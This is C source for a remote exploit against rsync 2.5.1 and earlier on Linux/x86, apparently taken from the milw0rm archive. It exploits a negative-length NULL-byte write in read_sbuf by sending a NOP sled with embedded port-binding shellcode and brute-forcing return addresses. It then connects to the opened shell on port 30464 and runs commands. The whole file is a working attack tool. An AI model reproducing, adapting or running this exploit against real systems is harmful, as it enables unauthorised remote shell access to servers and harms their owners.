/*** 7350fuqnut - rsync <= 2.5.1 remote exploit -- linux/x86 ver. 
 ***
 *** current version 2.5.5 but bug was silently fixed it appears
 *** so vuln versions still ship, maybe security implemecations
 *** were not recognized. 
 ***
 *** we can write NULL bites below &line[0] by supplying negative
 *** lengths. read_sbuf calls buf[len] = 0. standard NULL byte off
 *** by one kungf00 from there on.
 *** 
 *** - stealth
 ***/
 
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <netdb.h>
#include <errno.h>

#define MAXPATHLEN	4096
#define VERSION		"@RSYNCD: 26\n"

#define PORT 		873
#define NULL_OFFSET	-48
#define	STARTNULLBRUTE	-44
#define ENDNULLBRUTE	-56
#define BRUTEBASE 	0xbfff7777
#define INCREMENT	512
#define ALLIGN		0 /* pop byte allignment */

#define SEND		"uname -a; id\n"

int open_s(char *h, int p);
int setup(int s);
int exploit(int s);
void quit(int s); /* garbage quit */

void handleshell(int closeme, int s);
void usage(char *n);

char chode[] = /* Taeho oh, port 30464 */
"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";

struct x_info {
	char *h;
	int p;
	char *module;
	int null_offset;
	u_long brutebase;
	int shell;
	int checkvuln;
	int nullbrute;
	int allign;
} rsx;
	

int
main(int argc, char **argv)
{
	char c;
	int s;
	u_long store;
	
	if(argc == 1) usage(argv[0]);

	rsx.h = "localhost";
	rsx.p = PORT;
	rsx.null_offset = NULL_OFFSET;
	rsx.brutebase = BRUTEBASE;
	rsx.nullbrute = 0;
	rsx.allign = ALLIGN;

	
	while((c = getopt(argc, argv, "h:p:m:o:b:Ba:")) != EOF) {
		switch(c) {
			case 'h':
				rsx.h = optarg;
				break;
			case 'p':
				rsx.p = atoi(optarg);
				break;
			case 'm':
				rsx.module = optarg;
				break;
			case 'o':
				rsx.null_offset = atoi(optarg);
				break;
			case 'b':
				rsx.brutebase = strtoul(optarg, (char **)optarg+strlen(optarg), 16);
				break;
			case 'B':
				rsx.nullbrute = 1;
				break;
			case 'a':
				rsx.allign = atoi(optarg);
				if(rsx.allign>4) {
					fprintf(stderr, "allign > 4 !? using default\n");
					rsx.allign = ALLIGN;
				}
				break;
			default:
				usage(argv[0]);
		}
	}
	
	/* NULL byte brute wrap */
	
	store = rsx.brutebase;
	
	if(rsx.nullbrute) 
		for(rsx.null_offset = STARTNULLBRUTE; rsx.null_offset >= ENDNULLBRUTE; rsx.null_offset--) 
{
			fprintf(stderr, "\noffset: %d\n", rsx.null_offset);		
			/* start run -- cuten this up with some connectback shellcode */
			for(rsx.checkvuln = 1; rsx.brutebase <= 0xbfffffff; rsx.brutebase += INCREMENT) {
				if((s = open_s(rsx.h, rsx.p)) < 0) {
					fprintf(stderr, "poop..bye\n");
					exit(1);
				}
	
				if(setup(s) > 0) 
					if(exploit(s) > 0) 
						handleshell(s, rsx.shell);
			}
			rsx.brutebase = store;			
		}	 
	

 	for(rsx.checkvuln = 1; rsx.brutebase <= 0xbfffffff; rsx.brutebase += INCREMENT) {
                if((s = open_s(rsx.h, rsx.p)) < 0) {
                        fprintf(stderr, "poop..bye\n");
                        exit(1);
                }

                if(setup(s) > 0)
                        if(exploit(s) > 0)
                                handleshell(s, rsx.shell);
        }


	fprintf(stderr, "No luck...bye\n");	
	exit(0);
}

void
quit(int s)
{
	/* we just write a garbage quit to make the remote end the process */
	/* very crude but who cares */
	write(s, "QUIT\n", 5);
	close(s);
}  

int
setup(int s)
{
	/* we just dump our setup info on the socket. kludge */
	
	char out[512], *check;
	long version = 0;
	
	
	if(rsx.checkvuln) {
		rsx.checkvuln = 0; /* just check once */
		
		/* get version reply -- vuln check */
		memset(out, '\0', sizeof(out));
		read(s, out, sizeof(out)-1);
		if((check = strchr(out, (int)':')) != NULL) {
			version = strtoul((char *)check+1, (char **)check+3, 0);
			if(version >= 26) {
				fprintf(stderr, "target is not vulnerable (version: %d)\n", version);
				quit(s);
				exit(0);
			}
		}
		else {
			fprintf(stderr, "did not get version reply..aborting\n");
			quit(s);
			exit(0);
		}
		
		fprintf(stderr, "Target appears to be vulnerable..continue attack\n");
	}
	
	/* our version string */	
	if(write(s, VERSION, strlen(VERSION)) < 0) return -1;

	/* the module we supposedly want to retrieve */
	memset(out, '\0', sizeof(out));
	snprintf(out, sizeof(out)-1, "%s\n", rsx.module);
	if(write(s, out, strlen(out)) < 0) return -1;
       	if(write(s, "--server\n", 9) < 0) return -1;
       	if(write(s, "--sender\n", 9) < 0) return -1;
	if(write(s, ".\n", 2) < 0) return -1;
	/* send module name once more */
	if(write(s, out, strlen(out)) < 0) return -1;
	/* send newline */
	if(write(s, "\n", 1) < 0) return -1;

	return 1;
}

int
exploit(int s) 
{
	
	char x_buf[MAXPATHLEN], b[4];
	int i;

	/* sleep(15); */

	memset(x_buf, 0x90, ((MAXPATHLEN/2)-strlen(chode)));
	memcpy(x_buf+((MAXPATHLEN/2)-strlen(chode)), chode, strlen(chode));
	/* allign our address bytes for the pop if needed */
        for(i=(MAXPATHLEN/2); i<((MAXPATHLEN/2)+rsx.allign);i++)
		x_buf[i] = 'x';
	for(i=((MAXPATHLEN/2)+rsx.allign); i<MAXPATHLEN; i+=4)
                *(long *)&x_buf[i] = rsx.brutebase;
	*(int *)&b[0] = (MAXPATHLEN-1);
	if(write(s, b, 4) < 0) return -1;
	if(write(s, x_buf, (MAXPATHLEN-1)) < 0) return -1;
	/* send NULL byte offset from &line[0] to read_sbuf() ebp */
	*(int *)&b[0] = rsx.null_offset;
	if(write(s, b, 4) < 0) return -1;
	/* let rsync know it can go ahead and own itself now */
	memset(b, '\0', 4);
	if(write(s, b, 4) < 0) return -1;

	/* zzz for shell setup */
	usleep(50000);
	
	/* check for our shell -- (mod this to be connectback friendly bruteforce) */
	fprintf(stderr, ";");
	if((rsx.shell = open_s(rsx.h, 30464)) < 0) {
		if(rand() % 2)
			fprintf(stderr, "P");
		else
			fprintf(stderr, "p");
		quit(s);
		return -1;
	}
	
	fprintf(stderr, "\n\nSuccess! (ret: %p offset: %d)\n\n", rsx.brutebase, rsx.null_offset);
	return 1;	
}
	
	
	
void
usage(char *n) {
	fprintf(stderr, 
			"\nUsage: %s\n"
			"\nOptions:\n" 
			"\t-h <rsync_host>\n" 
			"\t-m <module_to_request>\n"
			"\nExtra options:\n"
			"\t-p <rsync_port>\n"
			"\t-o <null_byte_offset>\n"
			"\t-a <byte_allignment_for_eip_pop>\n"
			"\nBrute force options:\n"
			"\t-b <0xbruteforce_base_address>\n"
			"\t-B Turns on NULL byte offset bruting\n\n"
		, n);
	
	exit(0);
}
	

int
open_s(char *h, int p)
{
        struct sockaddr_in remote;
        struct hostent *iplookup;
        char *ipaddress;
        int sfd;

        if((iplookup = gethostbyname(h)) == NULL) {
                perror("gethostbyname");
                return -1;
        }

        ipaddress = (char *)inet_ntoa(*((struct in_addr *)iplookup->h_addr));
        sfd = socket(AF_INET, SOCK_STREAM, 0);

        remote.sin_family = AF_INET;
        remote.sin_addr.s_addr = inet_addr(ipaddress);
        remote.sin_port = htons(p);
        memset(&(remote.sin_zero), '\0', 8);

        if(connect(sfd, (struct sockaddr *)&remote, sizeof(struct sockaddr)) < 0) return -1;
        
        return sfd;
}

void
handleshell(int closeme, int s)   
{
        char in[512], out[512];
	fd_set fdset;
        
	close(closeme);
	
	if(write(s, SEND, strlen(SEND)) < 0 ) {
		fprintf(stderr, "write error\n");
		exit(1);
	}	
 
        while(1) {
        
                FD_ZERO(&fdset);
                FD_SET(fileno(stdin), &fdset);
                FD_SET(s, &fdset);
        
                select(s+1, &fdset, NULL, NULL, NULL);
        
                if(FD_ISSET(fileno(stdin), &fdset)) {
                        memset(out, '\0', sizeof(out));
                        if(read(0, out, (sizeof(out)-1)) < 0) {
				fprintf(stderr, "read error\n");
                                exit(1);
			}
			if(!strncmp(out, "exit", 4)) {
                                write(s, out, strlen(out));
                                quit(s);
				exit(0);
                        }
                        if(write(s, out, strlen(out)) < 0) {
                                fprintf(stderr, "write error\n");
                                exit(1);
                        }
                }
        
                if(FD_ISSET(s, &fdset)) {
                        memset(in, '\0', sizeof(in));
                        if(read(s, in, (sizeof(in)-1)) < 0) {
                                fprintf(stderr, "read error\n");
                                exit(1);
                        }
               		fprintf(stderr, "%s", in);
		}
        }
}

// milw0rm.com [2002-01-01]